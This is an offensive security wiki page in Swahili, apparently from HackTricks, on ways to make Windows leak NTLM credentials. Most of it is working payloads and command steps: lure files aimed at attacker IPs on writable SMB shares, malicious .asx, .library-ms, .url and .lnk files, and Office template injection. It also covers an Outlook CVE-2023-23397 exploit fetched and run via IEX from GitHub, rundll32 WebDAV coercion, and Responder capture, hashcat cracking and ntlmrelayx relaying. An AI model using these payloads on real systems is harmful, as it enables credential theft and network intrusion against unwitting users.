# Sehemu za kuiba creds za NTLM

{{#include ../../banners/hacktricks-training.md}}

**Angalia mawazo yote mazuri katika [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/), kuanzia kupakua faili la Microsoft Word mtandaoni hadi chanzo cha leak za NTLM: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md na [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### SMB share inayoweza kuandikiwa + mitego ya UNC inayoanzishwa na Explorer (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Ukiweza **kuandika kwenye share ambayo watumiaji au kazi zilizopangwa hupitia kwa kutumia Explorer**, weka faili ambazo metadata yake inaelekeza kwenye UNC yako (k.m. `\\ATTACKER\share`). Kuonyesha yaliyomo kwenye folda huanzisha **uthibitishaji fiche wa SMB** na kuvuja kwa **NetNTLMv2** kwenda kwa listener yako.<sup>[[1]](#references)</sup>

1. **Tengeneza mitego** (inajumuisha SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/n.k.)

```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```

2. **Ziweke kwenye share inayoweza kuandikiwa** (folda yoyote ambayo mwathiriwa hufungua):

```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```

3. **Sikiliza na crack**:

```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```

Windows inaweza kufikia faili kadhaa kwa wakati mmoja; chochote kinachoonyeshwa awali na Explorer (`BROWSE TO FOLDER`) hakihitaji mibofyo yoyote.

### Orodha za kucheza za Windows Media Player (.ASX/.WAX)

Ukiweza kumfanya mlengwa afungue au aonyeshe awali orodha ya kucheza ya Windows Media Player unayoidhibiti, unaweza kuvuja Net‑NTLMv2 kwa kuelekeza ingizo kwenye njia ya UNC. WMP itajaribu kupata faili ya media iliyorejelewa kupitia SMB na itajithibitisha kimyakimya.<sup>[[3]](#references)[[4]](#references)</sup>

Mfano wa payload:

```xml
<asx version="3.0">
  <title>Leak</title>
  <entry>
    <title></title>
    <ref href="file://ATTACKER_IP\\share\\track.mp3" />
  </entry>
</asx>
```

Mtiririko wa ukusanyaji na cracking:

```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

### .library-ms iliyopachikwa kwenye ZIP NTLM leak (CVE-2025-24071/24055)

Windows Explorer hushughulikia .library-ms kwa njia isiyo salama inapofunguliwa moja kwa moja kutoka ndani ya kumbukumbu ya ZIP. Ikiwa ufafanuzi wa library unaelekeza kwenye njia ya mbali ya UNC (kwa mfano, \\attacker\share), kuvinjari/kufungua tu .library-ms iliyo ndani ya ZIP husababisha Explorer kuorodhesha UNC na kutuma uthibitishaji wa NTLM kwa mshambuliaji. Hii hutoa NetNTLMv2 inayoweza kuvunjwa offline au, huenda, kupelekwa tena.<sup>[[2]](#references)</sup>

Minimal .library-ms inayoelekeza kwenye UNC ya mshambuliaji

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <version>6</version>
  <name>Company Documents</name>
  <isLibraryPinned>false</isLibraryPinned>
  <iconReference>shell32.dll,-235</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.14.2\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

Hatua za utekelezaji
- Unda faili ya .library-ms kwa kutumia XML iliyo hapo juu (weka IP/hostname yako).
- Iweke kwenye ZIP (kwenye Windows: Send to → Compressed (zipped) folder) na upeleke ZIP kwa lengo.
- Endesha listener ya kunasa NTLM na usubiri mwathiriwa afungue faili ya .library-ms kutoka ndani ya ZIP.


### Njia ya sauti ya kikumbusho cha kalenda ya Outlook (CVE-2023-23397) – leak ya Net-NTLMv2 ya zero-click

Microsoft Outlook for Windows ilichakata sifa ya extended MAPI PidLidReminderFileParameter katika vipengee vya kalenda. Ikiwa sifa hiyo inaelekeza kwenye UNC path (k.m., \\attacker\share\alert.wav), Outlook ingeunganisha kwenye SMB share kikumbusho kilipozima, na kusababisha leak ya Net-NTLMv2 ya mtumiaji bila kubofya chochote. Hili lilifanyiwa marekebisho tarehe 14 Machi 2023, lakini bado ni muhimu sana kwa mifumo ya zamani/isiyorekebishwa na kwa uchunguzi wa matukio ya kihistoria.<sup>[[5]](#references)</sup>

Utekelezaji wa haraka kwa PowerShell (Outlook COM):

```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```

Upande wa Listener:

```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```

Vidokezo
- Mhasiriwa anahitaji tu Outlook for Windows iwe inaendeshwa wakati ukumbusho unapoanzishwa.
- leak hutoa Net‑NTLMv2 inayofaa kwa cracking ya offline au relay (si pass-the-hash).


### .LNK/.URL leak ya NTLM ya zero-click inayotegemea ikoni (CVE‑2025‑50154 – bypass ya CVE‑2025‑24054)

Windows Explorer huonyesha ikoni za njia za mkato kiotomatiki. Utafiti wa hivi karibuni ulionyesha kwamba hata baada ya Microsoft kutoa kiraka cha Aprili 2025 cha njia za mkato zenye ikoni za UNC, bado iliwezekana kuanzisha uthibitishaji wa NTLM bila kubofya chochote kwa kuweka lengwa la njia ya mkato kwenye njia ya UNC na kuacha ikoni kwenye kompyuta ya ndani (bypass ya kiraka iliyopewa CVE‑2025‑50154). Kuangalia tu folda husababisha Explorer kupata metadata kutoka kwa lengwa la mbali, na hivyo kutuma NTLM kwa seva ya SMB ya mshambuliaji.<sup>[[6]](#references)</sup>

Payload ndogo ya Internet Shortcut (.url):

```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```

Sanidi payload ya njia ya mkato (.lnk) kupitia PowerShell:

```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```

Mawazo ya delivery
- Weka shortcut ndani ya ZIP na umshawishi mwathiriwa aifungue.
- Weka shortcut kwenye share inayoweza kuandikiwa ambayo mwathiriwa atafungua.
- Ichanganye na faili nyingine za kuvutia zilizo kwenye folda hiyo hiyo ili Explorer ionyeshe preview ya vipengee.

### .LNK ya no-click inayosababisha NTLM leak kupitia njia ya ikoni ya ExtraData (CVE‑2026‑25185)

Windows hupakia metadata ya `.lnk` wakati wa **kutazama/kuonyesha preview** (kuchora ikoni), si wakati wa kuiendesha tu. CVE‑2026‑25185 inaonyesha njia ya uchanganuzi ambapo vizuizi vya **ExtraData** husababisha shell kutatua njia ya ikoni na kufikia filesystem **wakati wa kupakia**, na hivyo kutuma NTLM nje ikiwa njia hiyo ni ya mbali.

Masharti muhimu ya kichocheo (yaliyoonekana katika `CShellLink::_LoadFromStream`):
- Jumuisha **DARWIN_PROPS** (`0xa0000006`) kwenye ExtraData (kichocheo cha utaratibu wa kusasisha ikoni).
- Jumuisha **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) huku **TargetUnicode** ikiwa na thamani.
- Loader hupanua vigeu vya mazingira katika `TargetUnicode` na kuita `PathFileExistsW` kwenye njia inayopatikana.

Ikiwa `TargetUnicode` itatatua kuwa njia ya UNC (kwa mfano, `\\attacker\share\icon.ico`), **kutazama tu folda** iliyo na shortcut husababisha uthibitishaji wa nje. Njia hiyo hiyo ya upakiaji inaweza pia kuchochewa na **indexing** na **uchanganuzi wa AV**, hivyo kuifanya iwe sehemu halisi ya leak isiyohitaji kubofya.<sup>[[7]](#references)</sup>

Zana za utafiti (parser/generator/UI) zinapatikana katika mradi wa **LnkMeMaybe** ili kuunda/kukagua miundo hii bila kutumia Windows GUI.<sup>[[8]](#references)</sup>


### Kulazimisha uthibitishaji wa WebDAV / kuthibitisha credentials kupitia `davclnt.dll,DavSetCookie`

**WebDAV client** asilia inaweza kutumiwa vibaya kulazimisha logon session ya sasa kuthibitisha kwa endpoint yoyote ya **HTTP/WebDAV**:

```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```

Kwa nini hili ni muhimu:
- Dhidi ya **seva ya WebDAV inayodhibitiwa na mshambulizi**, linaweza kuanzisha **NTLM kupitia HTTP** bila kutumia client maalum.
- Dhidi ya **host za ndani**, ni njia tulivu ya **kuthibitisha mahali credentials zilizoibwa zinakubaliwa** kabla ya kufanya lateral movement.<sup>[[9]](#references)</sup>
- Amri hii ni mbadala mzuri wakati **trafiki ya kutoka ya SMB imezuiwa kwa kichujio** lakini **HTTP/WebDAV** bado inaweza kufikiwa.

Vidokezo vya utekelezaji:
- Huduma ya **WebClient** lazima iwe inaendeshwa kwenye host chanzo.
- `rundll32.exe` hupakia `davclnt.dll` na kuifanya Windows ishughulikie uthibitishaji wa WebDAV kwa kutumia **credentials za mtumiaji wa sasa**.<sup>[[10]](#references)</sup>
- Ukiielekeza kwenye miundombinu unayodhibiti, tumia listener/relay ya HTTP inayofahamu NTLM kama vile:

```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```

Kwa mtazamo wa ugunduzi, kurudiwa kwa utekelezaji wa `rundll32.exe davclnt.dll,DavSetCookie` dhidi ya mifumo mingi ya ndani ni ishara thabiti ya **uthibitishaji wa credentials / maandalizi ya lateral movement yanayofanana na spray**, badala ya tabia ya kawaida ya mtumiaji.<sup>[[9]](#references)[[11]](#references)</sup>

### Office remote template injection (.docx/.dotm) ili kulazimisha NTLM

Nyaraka za Office zinaweza kurejelea kiolezo cha nje. Ukiweka kiolezo kilichoambatishwa kuwa njia ya UNC, kufungua hati kutasababisha uthibitishaji kupitia SMB.

Mabadiliko ya chini kabisa ya uhusiano wa DOCX (ndani ya word/):

1) Hariri word/settings.xml na uongeze rejeleo la kiolezo kilichoambatishwa:

```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```

2) Hariri word/_rels/settings.xml.rels na uelekeze rId1337 kwenye UNC yako:

```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```

3) Pakia upya kuwa .docx na uwasilishe. Washa listener yako ya kunasa SMB na usubiri faili lifunguliwe.

Kwa mawazo ya hatua za baada ya kunasa kuhusu ku-relay au kutumia vibaya NTLM, angalia:

{{#ref}}
README.md
{{#endref}}


## References
- [1] [HTB: Breach – Chambo kupitia share inayoweza kuandikwa + kunasa kwa Responder → kuvunja NetNTLMv2 → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 hadi DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — NTLM leak ya WMP → NTFS junction hadi webroot RCE → FullPowers + GodPotato hadi SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – Athari 5 za NTLM: Vitisho vya kupandisha mamlaka ambavyo havijapatiwa viraka katika Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft inapunguza udhaifu wa Outlook wa EoP (CVE‑2023‑23397) na kueleza NTLM leak kupitia PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Bila kubofya, NTLM moja: Kukwepa kiraka cha usalama cha Microsoft (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: Mapitio ya CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [Zana za TrustedSec LnkMeMaybe](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – IT Support Inapopiga Simu: Kuchambua kampeni ya ModeloRAT kutoka Teams hadi kuathiriwa kwa domain](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – Kichwa cha davclnt.h](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – Ombi la Windows Rundll32 WebDAV](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com - Maeneo ya Kuvutia kwa Kuiba Hash za Netntlm](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
{{#include ../../banners/hacktricks-training.md}}
